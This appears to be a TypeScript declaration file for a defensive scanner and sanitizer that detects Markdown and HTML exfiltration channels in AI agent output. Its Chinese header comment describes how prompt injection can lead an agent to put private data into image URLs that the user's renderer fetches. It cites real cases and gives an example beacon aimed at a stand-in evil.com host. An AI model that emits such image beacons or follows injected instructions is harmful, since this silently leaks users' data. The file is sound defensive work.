/**
 * 渲染层外泄引擎（Render-layer Exfiltration / Markdown Injection Scanner）。
 *
 * 威胁模型：**渲染即执行** —— Agent 输出的 Markdown/HTML 会被宿主前端渲染，
 * 渲染器本身就是一个带副作用的执行器：`![img](https://evil.com/pixel?d=<数据>)`
 * 会让客户端**自动发起 HTTP 请求**（图片信标/beacon），URL 的 query 就是外泄信道。
 * 这条 fetch 不经过任何工具调用，完全绕过工具侧全部防线（SSRF 引擎管不住它，
 * 因为被攻击的不是 Agent 的工具，而是用户的前端渲染器）。
 *
 * 实证案例（本攻击类 2025-2026 已有多个真实 CVE / 厂商公告）：
 *  - CVE-2026-22551 / GHSA-qwjm-9c66-w4q4：Eclipse Theia AI Chat（@theia/ai-chat-ui
 *    < 1.71.0）直接渲染 AI 响应中的 Markdown 图片标签，恶意工作区 + 提示注入可诱导
 *    Agent 构造编码敏感数据的图片 URL 静默外传（CVSS 6.5）
 *  - Anthropic Claude 图片 URL 外泄 PoC（embracethered.com，间接注入让 Claude 把
 *    私有对话内容拼进 markdown 图片 URL）
 *  - Checkmarx：Microsoft Copilot Chat 与 Google Gemini 的 Markdown Injection
 *  - Sourcegraph Amp Code 的 markdown 渲染外泄修复
 *
 * 与输出侧扫描（guardian/output）互补成完整输出防线：
 *  - 输出侧扫描 = 输出**内容**有没有密钥/Canary（值敏感）
 *  - 本引擎 = 输出**结构**是不是外泄信道/视觉欺骗（URL 是信道，哪怕零密钥——
 *    编码后的任意上下文数据照样泄露；显示文本与 href 不一致则是钓鱼欺骗）
 *
 * 三层能力（确定性、无 LLM、可单测）：
 *  1. scanMarkdown  —— 检测图片信标 / 链接显示欺骗 / 危险 HTML / 危险协议 / 隐形字符
 *  2. sanitize      —— 无害化改写（DOMPurify 思路的 markdown 子集：只改危险构造，
 *                      图片信标移除、欺骗链接显真、危险标签剥除，良性内容原样保留）
 *  3. 代码块豁免    —— 围栏代码块/行内代码不参与检测（渲染为等宽文本，不 fetch 不
 *                      执行），Agent 合法讲解攻击 payload 不误报
 *
 * 借鉴：DOMPurify（净化哲学）、Checkmarx Markdown Injection 研究、
 * embracethered.com Claude 外泄 PoC、OWASP LLM01:2025（提示注入→外泄链）。
 */
export type RenderSeverity = 'poison' | 'suspect';
export interface RenderFinding {
    ruleId: string;
    severity: RenderSeverity;
    /** 命中位置：text / image / link / definition:<label> / html:<tag> */
    where: string;
    reason: string;
    /** 命中片段（截断；隐形字符已显影为可读明文） */
    excerpt: string;
}
export interface RenderVerdict {
    /** false = 存在 poison 级命中，宿主不应原样渲染，应改用 sanitized */
    safe: boolean;
    findings: RenderFinding[];
    /** 存在 suspect 级命中（可渲染但建议告警） */
    requiresReview: boolean;
    /** 无害化版本。safe=true 时等于原文；safe=false 时为可直接渲染的安全替代 */
    sanitized: string;
}
export interface RenderOptions {
    /** 可信图片域名（自有 CDN 等）：其图片 URL 带普通 query 不告警（精确/后缀匹配） */
    trustedImageHosts?: string[];
}
/** Unicode Tags「显影」：映射回可见 ASCII，把隐形注入变成人眼可读明文供审计 */
export declare function developTags(s: string): string;
/** HTML 实体解码（命名常用 + 十进制 + 十六进制）：`&#106;avascript:` → `javascript:` */
export declare function decodeEntities(s: string): string;
export interface Segment {
    code: boolean;
    text: string;
}
/**
 * 把 Markdown 切成 code / text 段。检测与净化只作用于 text 段。
 * 支持 ``` 与 ~~~ 围栏（含语言标注）、行内 `code` 与 ``code``。
 */
export declare function segmentMarkdown(md: string): Segment[];
interface UrlInfo {
    scheme: string;
    host: string;
    query: string;
    fragment: string;
}
/** 实体解码 + 去零宽后解析 URL 的 scheme/host/query/fragment */
export declare function parseUrl(raw: string): UrlInfo;
/**
 * 扫描待渲染的 Markdown 输出。规则族 MDX（Markdown eXfiltration）：
 *  - MDX-001 图片信标：图片 URL 的 query/fragment 是外泄信道
 *  - MDX-002 链接显示欺骗：可见文本与真实 href 不一致（钓鱼/伪装）
 *  - MDX-003 危险 HTML：script/iframe/object/… 与 on* 事件属性
 *  - MDX-004 危险协议：javascript: / data:text/html 等
 *  - MDX-005 隐形字符：双向文本/Tags/零宽（渲染层视觉伪装）
 */
export declare function scanMarkdown(md: string, opts?: RenderOptions): RenderFinding[];
/** findings → 判定：poison 存在即不安全；sanitize 后可作为安全替代 */
export declare function verdictOf(md: string, findings: RenderFinding[], opts?: RenderOptions): RenderVerdict;
/** 一步到位：扫描 + 判定 + 净化 */
export declare function scanAndJudge(md: string, opts?: RenderOptions): RenderVerdict;
/**
 * 无害化：保留信息、移除信道。图片信标→占位文本；欺骗链接→显真；
 * 危险 HTML→剥除；事件属性→剥除；隐形字符→剥除；代码块原样保留；
 * 良性链接/图片不动。
 */
export declare function sanitizeMarkdown(md: string, opts?: RenderOptions): string;
export {};
